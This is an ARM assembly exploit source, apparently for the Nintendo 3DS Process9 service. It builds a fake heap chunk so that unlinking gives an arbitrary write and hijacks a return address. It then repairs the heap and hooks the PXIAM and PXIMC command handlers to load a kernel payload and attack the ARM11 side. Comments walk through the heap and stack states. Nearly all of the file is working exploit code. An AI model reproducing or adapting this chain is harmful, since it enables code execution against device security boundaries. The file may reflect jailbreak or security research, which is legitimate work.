.arm

// address of the 'pop {r4-r6, pc}' instruction at the end of __cpp_initialize__aeabi_
.equ POP_R4R5R6PC_ADDR, 0x08084E08+1

// stack frame of nn::fnd::detail::RecycleRegion
.equ RECYCLE_REGION_STACK_FRAME, 0x080C5DD0
// location of the return address of nn::fnd::detail::RecycleRegion on the stack (returns to nn::fnd::detail::FreeToHeap)
.equ RECYCLE_REGION_STACK_RETURN_ADDR, RECYCLE_REGION_STACK_FRAME+0x14

.equ PXIAM_IMPORT_CERTIFICATES_RETURN_CODE_STACK_OFFSET, 0x30

.equ TARGET_CHUNK_SIZE, 0x2800
.equ MEMCHUNK_HDR_PREV, 0x8
.equ MEMCHUNK_HDR_NEXT, 0xC
.equ MEMCHUNK_HDR_SIZE, 0x10

// address of pximcShutdown case's ptr in pximc jump table (switch)
.equ PXIMC_SHUTDOWN_JUMP_TABLE_PTR, 0x08080E20
.equ PXIMC_SWITCH_RETURN, 0x08080E64

// address of pxiamImportCertificates case's ptr in pxiam jump table (switch)
.equ PXIAM_IMPORT_CERTIFICATES_JUMP_TABLE_PTR, 0x08081728
.equ PXIAM_SWITCH_BREAK, 0x080828D0
.equ PXIAM_SWITCH_RETURN, 0x08081750

.equ HEAP_ALLOCATE, 0x0805A110


/*
  This is the entry point.
  Here's the stack state when jumping to _start:

  |---------------------- RecycleRegion stack frame ----------------------|
  | 080C5DD0:   0x08??????    <ptr to new_free_chunk (contains our code)> |
  | 080C5DD4:   ...                                                       |
  | 080C5DD8:   ...                                                       |
  | 080C5DDC:   ...                                                       |
  | 080C5DE0:   ...                                                       |
  | 080C5DE4:   0x08084E08+1  <return address (POP_R4R5R6PC_ADDR)>        |
  |                                                                       |
  |------------------------ FreeToHeap stack frame -----------------------|
  | 080C5DE8:   0x08??????    <ptr to new_free_chunk (contains our code)> |                                               |
  | 080C5DEC:   ...                                                       |
  | 080C5DF0:   ...                                                       |
  | 080C5DF4:   0x08??????    <pointer to _start (popped to pc)>          |
  | 080C5DF8:   ...           <--- sp points here                         |
  | 080C5DFC:   0x08053B3E+1  <return address>                            |
  |-----------------------------------------------------------------------|

  We gain control when returning from RecycleRegion, therefore we are "hooking"
  the execution flow of FreeToHeap. So we first set sp = 0x080C5DE8 to match
  with the FreeToHeap function stack frame, then we do our things and eventually
  we return to the actual service code by doing 'pop {r2-r6, pc}' which is the
  return instruction of FreeToHeap.
*/

.section    .text.start, "ax", %progbits
.align      2
.global     _start
.type       _start, %function
_start:
  sub sp, sp, #0x10       // match sp with the FreeToHeap stack frame

  /*
    clean .bss section
  */
  adr r1, _start
  ldr r0, =__bss_start    // offset of .bss section start relative to _start
  ldr r2, =__bss_end      // offset of .bss section end relative to _start
  sub r2, r2, r0          // size of .bss section
  add r0, r0, r1          // address of .bss section
  mov r1, #0
  bl memset               // memset(bss_section, 0, bss_section_size)

  /*
    [sp] holds a pointer (see stack state in above comments) to the free chunk
    that contains this code (starting somewhere before _start and ending at
    fake_free_chunk)
    heapRepair removes the chunk that contains this code from the free list
    (we don't want it to be reallocated since it holds our code) and then
    repairs fake_free_chunk
  */
  ldr r0, [sp]
  bl heapRepair
  bl installHooks

  /*
    change return code of pxiamImportCertificates on stack to force success
  */
  mov r0, #0
  str r0, [sp, #PXIAM_IMPORT_CERTIFICATES_RETURN_CODE_STACK_OFFSET]

  pop {r2-r6, pc}         // return to actual service code


/*
  Install hooks for PXIAM:PXIAM:ImportCertificates and PXIMC:Shutdown command
  handlers.
*/
installHooks:
  ldr r0, =PXIAM_IMPORT_CERTIFICATES_JUMP_TABLE_PTR
  adr r1, _pxiamImportCertificatesHook
  str r1, [r0]
  ldr r0, =PXIMC_SHUTDOWN_JUMP_TABLE_PTR
  adr r1, _pximcShutdownHook
  str r1, [r0]
  bx lr


/*
  Hook for PXIAM:ImportCertificates command handler in pxiam switch.
  Once it is installed by installHooks, p9 will jump here instead of jumping to
  the original switch case.

  We use this hook to receive the kernelhaxcode binary which is sent as a
  certificate via the PXIAM:ImportCertificates command.
*/
_pxiamImportCertificatesHook:
  mov r0, r5                      // r0 = cmdbuf
  bl pxiamImportCertificatesHook  // pxiamImportCertificatesHook(cmdbuf)
  ldr r1, =PXIAM_SWITCH_BREAK
  bx r1                           // return to actual service code


/*
  Hook for PXIMC:Shutdown command handler in pximc switch.
  Once it is installed by installHooks, p9 will jump here instead of jumping to
  the original switch case.

  We use this hook to takeover PXI on the arm11 side (see pximcShutdownHook and
  pximcShutdownReply) via a stack-buffer-overflow.
*/
_pximcShutdownHook:
  mov r0, r4                      // r0 = cmdbuf
  bl pximcShutdownHook            // pximcShutdownHook(cmdbuf)
  ldr r1, =PXIMC_SWITCH_RETURN
  bx r1                           // return to actual service code


/*
  Panic syscall.
*/
.global panic
.type panic, %function
panic:
  mov r0, #0
  svc 0x3C


/*
  Call malloc in the original service code.
*/
.global heapAllocate
.type heapAllocate, %function
heapAllocate:
  ldr r1, =HEAP_ALLOCATE
  bx r1


/*
  This is the chunk header overwritten to get an arb write when unlinking.


  ============================= STATE OF THE HEAP ==============================

  The size of the chunk is set to 0, this is required because after overflowing
  and before freeing, the heap looks as follow:

                          <-our code somewhere here->
  ------------------------------------------------------------------------------
   ||                ||                               ||
   ||  unalloc mem   ||     certificates memchunk     ||    fake_free_chunk
   ||    size=??     ||    state=alloc, size=0x2800   ||   state=free, size=0
   ||                ||                               ||
  ------------------------------------------------------------------------------
                      <---------overwritten range--------->

  When unlinking the chunks, it creates a new free chunk at the beginning of the
  unallocated memory region on the left of the certificate memchunk. To compute
  the size of this newly created chunk it sums the sizes of all three regions.
  Thus, by setting the fake_free_chunk size to 0, in the end after unlinking we
  have:
    new_free_chunk->data + new_free_chunk->size == fake_free_chunk
  And the heap looks as follow:

                          <-our code somewhere here->
  ------------------------------------------------------------------------------
   ||                                                 ||
   ||  new_free_chunk                                 ||    fake_free_chunk
   ||  size=??+0x2800                                 ||   state=free, size=0
   ||                                                 ||
  ------------------------------------------------------------------------------
                      <---------overwritten range--------->

  This is great because we can easily find fake_free_chunk knowing the address
  of new_free_chunk and then repair the heap (see _start and heapRepair).


  ============================= STATE OF THE STACK =============================

  To understand how we get code execution let's take a look at the state of the
  stack when getting the arb write:
  |----------------------- RecycleRegion stack frame -----------------------|
  | 080C5DD0:   0x08??????    <ptr to new_free_chunk>   <--- sp points here |
  | 080C5DD4:   ...                                                         |
  | 080C5DD8:   ...                                                         |
  | 080C5DDC:   ...                                                         |
  | 080C5DE0:   ...                                                         |
  | 080C5DE4:   0x0803361E+1  <return address (FreeToHeap+0x24)>            |
  |                                                                         |
  |------------------------- FreeToHeap stack frame ------------------------|
  | 080C5DE8:   0x08??????    <ptr to new_free_chunk>                       |
  | 080C5DEC:   ...                                                         |
  | 080C5DF0:   ...                                                         |
  | 080C5DF4:   0x08??????    <pointer to _start>                           |
  | 080C5DF8:   ...                                                         |
  | 080C5DFC:   0x08053B3E+1  <return address>                              |
  |-------------------------------------------------------------------------|

  Since the heap state is unknown at runtime we don't known the exact address of
  _start, so we can't directly overwrite the return address of RecycleRegion to
  make it points to _start.
  Fortunately since our code is located in the buffer getting freed, we can find
  its address in the FreeToHeap stack frame.
  We overwrite the return address of RecycleRegion to make it point to the
  'pop {r4-r6, pc}' instruction at the end of __cpp_initialize__aeabi_.
  Of course, since it's an unlink exploit this also implies writing something
  somewhere past the end of __cpp_initialize__aeabi_ but who cares? the code
  section is writable and this specific part is only used at startup...

  So in the end when unlinking this fake chunk we are doing:

    *((RECYCLE_REGION_STACK_RETURN_ADDR - 0xC) + 0xC) = POP_R4R5R6PC_ADDR;
    *(POP_R4R5R6PC_ADDR + 0x8) = RECYCLE_REGION_STACK_RETURN_ADDR - 0xC;

  i.e:

    // rewrite the return address
    *(RECYCLE_REGION_STACK_RETURN_ADDR) = POP_R4R5R6PC_ADDR;
    // write some garbage over an unused part of the code section
    *(POP_R4R5R6PC_ADDR + 0x8) = RECYCLE_REGION_STACK_RETURN_ADDR - 0xC;

  Here's the state of the stack after unlinking the chunk:
  |----------------------- RecycleRegion stack frame -----------------------|
  | 080C5DD0:   0x08??????    <ptr to new_free_chunk>   <--- sp points here |
  | 080C5DD4:   ...                                                         |
  | 080C5DD8:   ...                                                         |
  | 080C5DDC:   ...                                                         |
  | 080C5DE0:   ...                                                         |
  | 080C5DE4:   0x08084E08+1  <return address (POP_R4R5R6PC_ADDR)>          |
  |                                                                         |
  |------------------------- FreeToHeap stack frame ------------------------|
  | 080C5DE8:   0x08??????    <ptr to new_free_chunk (will pop to r4)>      |
  | 080C5DEC:   ...           <??? (will pop to r5)>                        |
  | 080C5DF0:   ...           <??? (will pop to r5)>                        |
  | 080C5DF4:   0x08??????    <pointer to _start (will pop to pc)>          |
  | 080C5DF8:   ...                                                         |
  | 080C5DFC:   0x08053B3E+1  <return address>                              |
  |-------------------------------------------------------------------------|

  So when returning from RecycleRegion, we directly jump to _start!
*/
.section  .fake_free_chunk
fake_free_chunk:
.word 0x00004652                                            // magic
.word 0x00000000                                            // size
.word POP_R4R5R6PC_ADDR                                     // prev
.word RECYCLE_REGION_STACK_RETURN_ADDR - MEMCHUNK_HDR_PREV  // next
